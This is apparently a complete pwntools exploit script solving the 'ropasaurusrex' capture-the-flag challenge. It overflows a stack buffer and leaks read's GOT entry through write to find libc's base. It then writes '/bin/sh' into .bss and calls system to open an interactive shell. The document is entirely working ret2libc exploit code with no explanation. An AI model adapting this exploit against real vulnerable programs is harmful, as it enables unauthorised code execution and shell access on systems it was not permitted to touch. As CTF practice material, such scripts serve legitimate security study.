from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
rop = ELF('./ropasaurusrex')
if args['REMOTE']:
    sh = remote('127.0.0.1', 7777)
else:
    sh = process('./ropasaurusrex')
libc = ELF('./libc.so')
read_plt = rop.plt['read']
write_plt = rop.plt['write']
read_got = rop.got['read']
bss_base = rop.bss()
pop3_ret = 0x080484b6
vul_addr = 0x080483F4
# get read addr
payload = flat(
    ['a' * 0x88, 'b' * 4, write_plt, pop3_ret, 1, read_got, 4, vul_addr])
sh.sendline(payload)
read_addr = u32(sh.recv(4))
libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
# read /bin/sh at bss base
# get shell
payload = flat([
    'a' * 0x88, 'b' * 4, read_plt, pop3_ret, 0, bss_base, 8, system_addr,
    'bbbb', bss_base
])
sh.sendline(payload)
#gdb.attach(sh)
sh.sendline('/bin/sh\x00')
sh.interactive()
